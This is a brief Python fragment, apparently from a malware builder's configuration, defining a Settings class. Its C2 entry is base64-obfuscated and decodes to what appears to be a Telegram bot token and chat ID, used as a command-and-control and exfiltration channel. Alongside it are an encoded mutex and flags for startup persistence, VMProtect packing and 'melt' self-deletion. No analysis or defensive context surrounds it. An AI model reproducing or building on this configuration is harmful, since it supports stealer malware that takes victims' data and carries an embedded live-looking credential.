...
class Settings:
    C2 = (1, base64.b64decode('NzcyMDMxNjc1MjpBQUdDV3dGcFhnbElxWU9pblM2NFotLXRQYWtBaDl5MU8zdyQtMTAwMjQ0NjY3ODM0Nw==').decode())
    Mutex = base64.b64decode('ZWxMTXlrbXJ4V0JDblFodw==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
